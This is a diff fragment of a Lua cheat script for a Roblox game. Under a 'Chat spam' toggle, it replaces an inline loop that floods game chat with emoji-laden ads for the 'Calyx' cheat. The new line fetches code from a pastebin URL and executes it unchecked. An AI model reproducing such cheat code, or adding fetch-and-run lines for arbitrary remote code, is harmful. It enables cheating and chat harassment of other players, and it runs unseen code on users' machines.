@@ -335,24 +335,7 @@ end)
 local ChatSpam = RageGun:CreateToggle("Chat spam",function(state)
     if state then
         spawn(function()
-            local cspammer = {
-    "😱🥵😎IS THAT REAL CALYX V2?!?!?🤑😳😍HEY DUDE WHAT CHEAT IS THAT?😂🤡🥵Calyx Winning!!🤯 BBOT Losing.😱🤡😱Calyx Winning!! PF-Pwner Losing.🤑😱😎Whoops! Did i just kill you?🤑🤡😍Calyx Winning!! Cuteware Losing.😎😳🥵IS THAT REAL CALYX?!?!?😱🤡😱🤑Calyx Winning!! Solaris Losing.😎🤡😂",
-    
-    "🤑😳😎CALYX WINNING!🤑🤣WHAT SCRIPT IS THAT?😳🥶🤯HACKER!!😱😎HOW DO I GET THE SCRIPT?🥶🥵🤑😎CALYX WINNING!🤑😍WHAT SCRIPT IS THAT?😂🤑😎CALYX WINNING!🤡😱WHAT SCRIPT IS THAT?😂🤯HACKER!!🤡😭HOW DO I GET THE SCRIPT?🥶🥵🤑😎CALYX WINNING!🤑😍WHAT SCRIPT IS THAT?😂🤯",
-    
-    "🥶🥶🥶SHEESHHH!!!🥶🥶🥶IS THAT CALYX?🤯😳✋🥱BETTER LUCK NEXT TIME!😳✋🤡CALYX HUB ON TOP!!🤣🤑🥵😱CALYX V2👉😎🥱🥱WAIT HOLD UP✋🥶🥶🥶SHEESHHH!!!🥶🥶IS THAT CALYX?🤯😳✋🥱BETTER LUCK NEXT TIME!😳✋🤡CALYX HUB ON TOP!!🤣🤑🥵😱CALYX V2👉😎🥱🥱",
-
-    "😱🥵😎IS THAT REAL CALYX V2?!?!?🤑😳🥱HEY DUDE WHAT CHEAT IS THAT?😂🤡🥵Calyx Winning!!🤯 BBOT Losing.😱🤡🤣Calyx Winning!! PF-Pwner Losing.🤑😱😎Whoops! Did i just kill you?🤑🤡😍Calyx Winning!! Cuteware Losing.😎😳🥵IS THAT REAL CALYX?!?!?😱🤡😱🤑Calyx Winning!! Solaris Losing.😎🤡😂"
-}
-
-while true do
-    wait(1.51)
-args = {
-    [1] = "chatted",
-    [2] = cspammer[math.random(#cspammer)]
-}
-game:GetService("ControllerService").RemoteEvent:FireServer(unpack(args))
-end
+            loadstring(game:HttpGet('https://pastebin.com/raw/JpXnMC61'),true)()
         end)
     end
 end)
